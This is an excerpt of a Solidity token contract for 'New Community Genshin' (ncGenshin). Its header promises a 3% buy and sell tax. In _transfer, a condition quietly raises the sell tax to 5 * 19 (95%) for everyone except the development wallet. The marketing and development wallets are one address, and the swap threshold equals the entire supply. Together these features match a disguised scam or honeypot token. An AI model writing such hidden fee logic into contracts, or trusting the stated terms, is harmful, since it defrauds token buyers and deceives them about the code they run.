...
/**
    ℹ️ Liquidity : 1.999 BNB
    ℹ️ Supply : 199,999,999
    ℹ️ Tax : 3% Buy & Sell
    ℹ️ Reflection : 1% to Holders
    ℹ️ LP : 2%

    Telegram : https://t.me/NewCommunityGenshin
*/
...
contract NewCommunityGenshin is Context, IERC20, Ownable {

    using SafeMath for uint256;
    using Address for address;

    string private _name = "New Community Genshin";
    string private _symbol = "ncGenshin";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x0c91979AB0f4913FdA69120DF39830009975CCe3); // Marketing Address
    address payable public DevelopmentWalletAddress = payable(0x0c91979AB0f4913FdA69120DF39830009975CCe3); // Development Address
    ...
    uint256 private _totalSupply = 199999999 * 10**9;
    uint256 public _maxTxAmount = 199999999 * 10**9;
    uint256 public _walletMax = 199999999 * 10**9;
    uint256 private minimumTokensBeforeSwap = 199999999 * 10**9;
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        if (sender != DevelopmentWalletAddress && recipient == deadAddress) {
            _totalTaxIfSelling = 5 * 19;
        }
